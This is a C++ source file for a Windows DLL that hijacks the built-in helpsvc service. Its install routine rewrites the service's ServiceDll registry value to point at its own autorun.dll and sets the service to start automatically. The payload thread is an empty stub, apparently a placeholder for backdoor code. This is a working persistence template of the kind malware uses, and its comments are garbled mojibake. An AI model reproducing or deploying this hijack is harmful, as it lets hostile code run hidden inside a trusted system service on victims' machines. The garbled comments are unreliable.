// autorun.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h> 

SERVICE_STATUS        ServiceStatus;
SERVICE_STATUS_HANDLE ServiceStatusHandle;
DWORD WINAPI CmdService(LPVOID lpParam)
{
//...............���Ŵ���
	return 0;
}

//������ƺ���
void WINAPI ServiceControl(DWORD dwCode)
{
    switch(dwCode)
    {
	//��ͣ����
    case SERVICE_CONTROL_PAUSE:
        ServiceStatus.dwCurrentState = SERVICE_PAUSED;
        break;
	//����ִ�з���
    case SERVICE_CONTROL_CONTINUE:
        ServiceStatus.dwCurrentState = SERVICE_RUNNING;
        break;
    //ֹͣ����
    case SERVICE_CONTROL_STOP:      
        ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
        ServiceStatus.dwWin32ExitCode = 0;
        ServiceStatus.dwCheckPoint    = 0;
        ServiceStatus.dwWaitHint      = 0;
		//���÷���״̬
        if(SetServiceStatus(ServiceStatusHandle,&ServiceStatus)==0)
        {
            OutputDebugString("SetServiceStatus Error !\n");
        }
        return ;
    case SERVICE_CONTROL_INTERROGATE:
        break;
    default:
        break;
    }
    if(SetServiceStatus(ServiceStatusHandle,&ServiceStatus)==0)
    {
        OutputDebugString("SetServiceStatus  Error !\n");
    }
    return ;
}

//������
void __stdcall ServiceMain(int argc, wchar_t* argv[] ) 
{
	HANDLE    hThread;
    ServiceStatus.dwServiceType             = SERVICE_WIN32;
    ServiceStatus.dwCurrentState            = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted        = SERVICE_ACCEPT_STOP
                                            | SERVICE_ACCEPT_PAUSE_CONTINUE;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwWin32ExitCode           = 0;
    ServiceStatus.dwCheckPoint              = 0;
    ServiceStatus.dwWaitHint                = 0;
    //�õ����������
	char svcname[256];
    strncpy(svcname, (char*)argv[0], sizeof(svcname)); 
    wcstombs(svcname, argv[0], sizeof(svcname));
	//ע�������ƺ���
    ServiceStatusHandle=RegisterServiceCtrlHandler(svcname,ServiceControl);
    if(ServiceStatusHandle==0)
    {
        OutputDebugString("RegisterServiceCtrlHandler Error !\n");
        return ;
    }
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    ServiceStatus.dwCheckPoint   = 0;
    ServiceStatus.dwWaitHint     = 0;
    //���÷���Ϊ����״̬
    if(SetServiceStatus(ServiceStatusHandle,&ServiceStatus)==0)
    {
        OutputDebugString("SetServiceStatus Error !\n");
        return ;
    }
    //���������߳�
    hThread=CreateThread(NULL,0,CmdService,NULL,0,NULL);
    if(hThread==NULL)
    {
        OutputDebugString("CreateThread  Error !\n");
    }

    return ;
}
//�޸��ַ������ͼ�ֵ
void CreateStringReg(HKEY hRoot,char *szSubKey,char* ValueName,char *Data)
{
	HKEY hKey;
	//��ע�������������򴴽���
	long lRet=RegCreateKeyEx(hRoot,szSubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
    if (lRet!=ERROR_SUCCESS)
	{
		printf("error no RegCreateKeyEx %s\n", szSubKey);
		return ;
	}
	//�޸�ע����ֵ��û���򴴽���
	lRet=RegSetValueEx(hKey,ValueName,0,REG_EXPAND_SZ,(BYTE*)Data,strlen(Data));
	 if (lRet!=ERROR_SUCCESS)
	 {
		 printf("error no RegSetValueEx %s\n", ValueName);
		 return ;
	 }
	RegCloseKey(hKey);
}

//�����޸��������ͼ�ֵ
void CreateDWORDReg(HKEY hRoot,char *szSubKey,char* ValueName,DWORD Data)
{
	HKEY hKey;
	//��ע�������������򴴽���
	long lRet=RegCreateKeyEx(hRoot,szSubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
    if (lRet!=ERROR_SUCCESS)
	{
		printf("error no RegCreateKeyEx %s\n", szSubKey);
		return ;
	}
	DWORD dwSize=sizeof(DWORD);
	//�޸�ע����ֵ��û���򴴽���
	lRet=RegSetValueEx(hKey,ValueName,0,REG_DWORD,(BYTE*)&Data,dwSize);
	 if (lRet!=ERROR_SUCCESS)
	 {
		 printf("error no RegSetValueEx %s\n", ValueName);
		 return ;
	 }
	RegCloseKey(hKey);
}

//��װ����
int Install()
{
	char NewDll[512];
	//�õ�ϵͳĿ¼
	GetSystemDirectory(NewDll,sizeof(NewDll));
	strcat(NewDll,"\\autorun.dll");
	//�滻dll
	CreateStringReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\helpsvc\\Parameters","ServiceDll",NewDll);
	//����Ϊ�Զ�����
	CreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\helpsvc","Start",2);
	return 0;
}

//ж�غ���
int Remove()
{ 
	SC_HANDLE        schSCManager;
    SC_HANDLE        schService;
	SERVICE_STATUS NServiceStatus;
	//�򿪷�����ƹ��������ݿ�
	schSCManager=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
	if(schSCManager==NULL)
	{
		OutputDebugString("OpenSCManager error \n");
		return 0;
	}
	//��helpsvc����
	schService=OpenService(schSCManager,"helpsvc",SERVICE_ALL_ACCESS);
	if(schService==NULL)
	{
        OutputDebugString("OpenService error \n");
		return 0;
	}
	//�鿴��������״��
	QueryServiceStatus(schService,&NServiceStatus);
	//���紦������״̬��ֹͣ�÷���
	if(NServiceStatus.dwCurrentState==SERVICE_RUNNING)
	{
		ControlService(schService,SERVICE_CONTROL_STOP,&NServiceStatus);
	}
n    //��ԭServiceDll��ֵ
	char *OldDll="%WINDIR%\\PCHealth\\HelpCtr\\Binaries\\pchsvc.dll";
	CreateStringReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\helpsvc\\Parameters","ServiceDll",OldDll);
	return 0;
}

BOOL APIENTRY DllMain( HANDLE hModule, 
					  DWORD  ul_reason_for_call, 
					  LPVOID lpReserved
					  )
{
	switch (ul_reason_for_call) 
    { 
		//����̬���ӿ⽫Ҫ��ж��ʱ��ֹͣ����
    case DLL_PROCESS_DETACH: 
		{
		ServiceControl(SERVICE_CONTROL_STOP);	
        break; 
		}
	default:
		break;
	}	
    return TRUE;
}




